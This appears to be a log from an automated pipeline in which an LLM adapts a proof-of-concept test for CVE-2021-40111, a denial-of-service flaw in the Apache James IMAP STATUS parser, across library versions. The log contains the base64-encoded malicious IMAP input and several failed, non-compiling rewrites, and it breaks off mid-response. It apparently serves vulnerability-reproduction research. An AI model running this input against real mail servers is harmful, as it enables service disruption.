[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] 
[INFO] --- maven-surefire-plugin:2.12.4:test (default-test) @ CVE-2021-40111 ---
[INFO] Surefire report directory: /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running edu.vision.se.Testcase1
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.187 sec

Results :

Tests run: 1, Failures: 0, Errors: 0, Skipped: 0

[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.650 s
[INFO] Finished at: 2025-07-13T15:30:46Z
[INFO] ------------------------------------------------------------------------

SLF4J: Failed to load class "org.slf4j.impl.StaticLoggerBinder".
SLF4J: Defaulting to no-operation (NOP) logger implementation
SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.

current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[96m[Adapter] No errors found in initial adaptation.[0m
[91m[Adapter] Assertion Failure.[0m
[LLMClient] Tokens used: 543 (prompt), 20 (completion), 563 (total)
[LLMClient] Prompt: 
You are given an vulnerability exploit in  3.4.0: 

Code: package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.imap.api.Tag;
import org.apache.james.imap.decode.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), new Tag("AEA"), new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, Tag tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
} 

Extract Call Graph of the API call in library org.apache.james.protocols:protocols-imap(at most 5) 

We use this information to collect diff files 

Output each API name as a `;`-separated list, with no explanations. Withour package name, parameter list. 


[LLMClient] Response: 
StatusCommandParser;decode;ImapRequestStreamLineReader;Tag;FakeImapSession
[96m[ErrorManager] Extracted key entities: ['StatusCommandParser', 'decode', 'ImapRequestStreamLineReader', 'Tag', 'FakeImapSession'][0m
Cause: ['StatusCommandParser', 'decode', 'ImapRequestStreamLineReader', 'Tag', 'FakeImapSession']
Related Diffs: [(5561, 16.0), (5052, 12.0), (5557, 12.0), (5562, 12.0), (5564, 12.0)]
[96m[RepairModule] Start repair[0m
[96m[RepairModule] Start repair[0m
[96m[RepairModule] Start repair[0m
[96m[RepairModule] Start repair[0m
[LLMClient] Tokens used: 685 (prompt), 513 (completion), 1198 (total)
[LLMClient] Prompt: 
You are given an assertion unmatch when executing test in in 3.4.0:org.apache.james.protocols:protocols-imap
This test file reproduced successfully in 3.5.0. with an org.junit.runners.model.TestTimedOutException

The reproduction beahavior is org.junit.runners.model.TestTimedOutException {'test timed out'}.
However, in 3.4.0, the test passed, which is not expected.
Your task is to solve the problem and reproduced the expected behavior in 3.4.0. Your are not to change assertion logic.
Current test file is package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("STATUS"), request, tag, session);
    }
}

Your task is 1. Analyze the cause of the errors 2. Decide fix position of the test 3. Output only the updated test without explanation

If you want to open an attact target server, you can open it in @BeforeClass
[LLMClient] Response: 
Based on the analysis, here's the updated test file that should reproduce the expected behavior in 3.4.0:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;


public class Testcase1 {
    @Test(timeout = 10000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);

        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("STATUS"), request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[93m[RepairModule] Repair failed, retrying 1/3[0m
[LLMClient] Tokens used: 1480 (prompt), 499 (completion), 1979 (total)
[LLMClient] Prompt: 
You are given an error when executing test in in 3.4.0:org.apache.james.protocols:protocols-imap
This test file compiles and runs successfully in 3.5.0.

The reproduction beahavior is org.junit.runners.model.TestTimedOutException {'test timed out'}.
However, in 3.4.0, the test failed with [INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[31,55] ')' expected
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.868 s
[INFO] Finished at: 2025-07-13T15:31:26Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[31,55] ')' expected
[ERROR] 
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


Your task is to solve the problemCurrent test file is package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;


public class Testcase1 {
    @Test(timeout = 10000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);

        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("STATUS"), request, tag, session);
    }
}

Output only the updated test without explanationIf you want to open an target server, you can only open it by 'python -m http.server' in @BeforeClass
[LLMClient] Response: 
Here's the updated test file:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;


public class Testcase1 {
    @Test(timeout = 10000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);

        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        "AEA", new FakeImapSession())))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("STATUS"), request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[93m[RepairModule] Repair failed, retrying 2/3[0m
[LLMClient] Tokens used: 1871 (prompt), 534 (completion), 2405 (total)
[LLMClient] Prompt: 
You are given an error when executing test in in 3.4.0:org.apache.james.protocols:protocols-imap
This test file compiles and runs successfully in 3.5.0.

The reproduction beahavior is org.junit.runners.model.TestTimedOutException {'test timed out'}.
However, in 3.4.0, the test failed with [INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,25] constructor ImapRequestStreamLineReader in class org.apache.james.imap.decode.ImapRequestStreamLineReader cannot be applied to given types;
  required: java.io.InputStream,java.io.OutputStream
  found: java.io.ByteArrayInputStream,java.lang.String,org.apache.james.imap.encode.FakeImapSession
  reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[37,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: no arguments
  found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
  reason: actual and formal argument lists differ in length
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.133 s
[INFO] Finished at: 2025-07-13T15:31:55Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,25] constructor ImapRequestStreamLineReader in class org.apache.james.imap.decode.ImapRequestStreamLineReader cannot be applied to given types;
[ERROR]   required: java.io.InputStream,java.io.OutputStream
[ERROR]   found: java.io.ByteArrayInputStream,java.lang.String,org.apache.james.imap.encode.FakeImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[37,9] constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: no arguments
[ERROR]   found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


Your task is to solve the problemCurrent test file is package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;


public class Testcase1 {
    @Test(timeout = 10000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);

        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("STATUS"), request, tag, session);
    }
}

Output only the updated test without explanationIf you want to open an target server, you can only open it by 'python -m http.server' in @BeforeClass
[LLMClient] Response: 
Here's the updated test file that should work with version 3.4.0:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;


public class Testcase1 {
    @Test(timeout = 10000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);

        assertThatThrownBy(() -> {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ImapRequestStreamLineReader reader = new ImapRequestStreamLineReader(
                new ByteArrayInputStream(bytes), outputStream);
            new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(reader, "AEA", new FakeImapSession());
        }).isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super();
    }

    public void decode(ImapRequestLineReader request, String tag, ImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("STATUS"), request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[93m[RepairModule] Repair failed, retrying 3/3[0m
[LLMClient] Tokens used: 1408 (prompt), 489 (completion), 1897 (total)
[LLMClient] Prompt: 
You are given an error when executing test in in 3.4.0:org.apache.james.protocols:protocols-imap
This test file compiles and runs successfully in 3.5.0.

The reproduction beahavior is org.junit.runners.model.TestTimedOutException {'test timed out'}.
However, in 3.4.0, the test failed with [INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] 
[INFO] --- maven-surefire-plugin:2.12.4:test (default-test) @ CVE-2021-40111 ---
[INFO] Surefire report directory: /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running edu.vision.se.Testcase1
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.19 sec

Results :

Tests run: 1, Failures: 0, Errors: 0, Skipped: 0

[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.674 s
[INFO] Finished at: 2025-07-13T15:32:27Z
[INFO] ------------------------------------------------------------------------

SLF4J: Failed to load class "org.slf4j.impl.StaticLoggerBinder".
SLF4J: Defaulting to no-operation (NOP) logger implementation
SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.

Your task is to solve the problemCurrent test file is package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;


public class Testcase1 {
    @Test(timeout = 10000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);

        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("STATUS"), request, tag, session);
    }
}

Output only the updated test without explanationIf you want to open an target server, you can only open it by 'python -m http.server' in @BeforeClass
[LLMClient] Response: 
Here's the updated test file:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.decode.ImapRequestLineReader;

public class Testcase1 {
    @Test(timeout = 10000)
